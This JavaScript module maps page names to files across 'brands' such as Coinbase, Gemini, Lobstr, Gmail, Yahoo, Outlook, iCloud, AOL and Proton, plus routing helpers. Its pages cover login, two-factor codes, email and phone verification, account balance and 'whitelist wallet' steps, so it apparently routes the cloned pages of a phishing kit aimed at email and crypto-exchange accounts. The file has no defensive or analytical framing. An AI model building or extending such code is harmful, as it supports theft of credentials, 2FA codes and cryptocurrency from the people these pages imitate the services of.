// Page mapping configuration to handle inconsistent file naming
// Maps logical page names to actual file names per brand

const pageMapping = {
  // Coinbase pages (no prefix, PascalCase)
  coinbase: {
    'loading': 'loading',
    'estimatedbalance': 'EstimatedBalance',
    'whitelistwallet': 'WhitelistWallet',
    'whitelistsuccessful': 'WhitelistSuccessful',
    'review': 'review',
    'captcha': 'captcha',
    'error': 'error',
    'twofactor': 'TwoFactor',
    'emailverify': 'EmailVerify',
    'phoneverify': 'PhoneVerify'
  },

  // Gemini pages (prefix + lowercase)
  gemini: {
    'loading': 'geminiloading',
    'estimatedbalance': 'geminiestimatedbalance',
    'whitelistwallet': 'geminiwhitelistwallet',
    'whitelistsuccessful': 'geminiwhitelistsuccessful',
    'review': 'geminireview',
    'captcha': 'captcha', // Shared captcha page
    'error': 'error',     // Shared error page
    'twofactor': 'geminitwofactor',
    'emailverify': 'geminiemailverify',
    'phoneverify': 'geminiphoneneverify'
  },

  // Lobstr pages (prefix + camelCase)
  lobstr: {
    'loading': 'lobstrloading',
    'estimatedbalance': 'lobstrEstimatedBalance',
    'whitelistwallet': 'lobstrWhitelistWallet',
    'whitelistsuccessful': 'lobstrWhitelistSuccessful',
    'review': 'lobstrreview',
    'captcha': 'captcha', // Shared captcha page
    'error': 'error',     // Shared error page
    'twofactor': 'lobstrTwoFactor',
    'emailverify': 'lobstrEmailVerify',
    'phoneverify': 'lobstrPhoneVerify'
  },

  // Gmail pages
  gmail: {
    'loading': 'gmaillogin',
    'login': 'gmaillogin',
    'twofactor': 'gmailtwofactor',
    'emailverify': 'gmailemailverify',
    'phoneverify': 'gmailphoneverify',
    'review': 'gmailreview',
    'captcha': 'captcha',
    'error': 'error'
  },

  // Yahoo pages
  yahoo: {
    'loading': 'yahoologin',
    'login': 'yahoologin',
    'twofactor': 'yahootwofactor',
    'emailverify': 'yahooemailverify',
    'phoneverify': 'yahoophoneverify',
    'review': 'yahooreview',
    'captcha': 'captcha',
    'error': 'error'
  },

  // Outlook pages
  outlook: {
    'loading': 'outlooklogin',
    'login': 'outlooklogin',
    'twofactor': 'outlooktwofactor',
    'emailverify': 'outlookemailverify',
    'phoneverify': 'outlookphoneverify',
    'review': 'outlookreview',
    'captcha': 'captcha',
    'error': 'error'
  },

  // iCloud pages
  icloud: {
    'loading': 'icloudlogin',
    'login': 'icloudlogin',
    'twofactor': 'icloudtwofactor',
    'emailverify': 'icloudemailverify',
    'phoneverify': 'icloudphoneverify',
    'review': 'icloudreview',
    'captcha': 'captcha',
    'error': 'error'
  },

  // AOL pages
  aol: {
    'loading': 'aollogin',
    'login': 'aollogin',
    'twofactor': 'aoltwofactor',
    'emailverify': 'aolemailverify',
    'phoneverify': 'aolphoneverify',
    'review': 'aolreview',
    'captcha': 'captcha',
    'error': 'error'
  },

  // Proton pages
  proton: {
    'loading': 'protonlogin',
    'login': 'protonlogin',
    'twofactor': 'protontwofactor',
    'emailverify': 'protonemailverify',
    'phoneverify': 'protonphoneverify',
    'review': 'protonreview',
    'captcha': 'captcha',
    'error': 'error'
  }
};

// Helper function to resolve page name to actual file name
function resolvePageName(brand, requestedPage) {
  // Normalize the requested page name
  const normalized = requestedPage
    .replace(/^\/+|\.html$/g, '')
    .toLowerCase()
    .trim();

  // Get brand mapping
  const brandMapping = pageMapping[brand] || pageMapping.gemini;

  // First try exact match in mapping
  if (brandMapping[normalized]) {
    return brandMapping[normalized];
  }

  // Try without brand prefix if it exists
  const withoutPrefix = normalized.replace(new RegExp(`^${brand}`), '');
  if (brandMapping[withoutPrefix]) {
    return brandMapping[withoutPrefix];
  }

  // If not found in mapping, return the original (for shared pages)
  return requestedPage.replace(/\.html$/, '');
}

// Helper to get all valid page names for a brand
function getValidPagesForBrand(brand) {
  const brandMapping = pageMapping[brand] || pageMapping.gemini;
  return Object.values(brandMapping);
}

// Helper to check if a page exists for a brand
function pageExistsForBrand(brand, pageName) {
  const resolved = resolvePageName(brand, pageName);
  const validPages = getValidPagesForBrand(brand);

  return validPages.some(page =>
    page.toLowerCase() === resolved.toLowerCase()
  );
}

export {
  pageMapping,
  resolvePageName,
  getValidPagesForBrand,
  pageExistsForBrand
};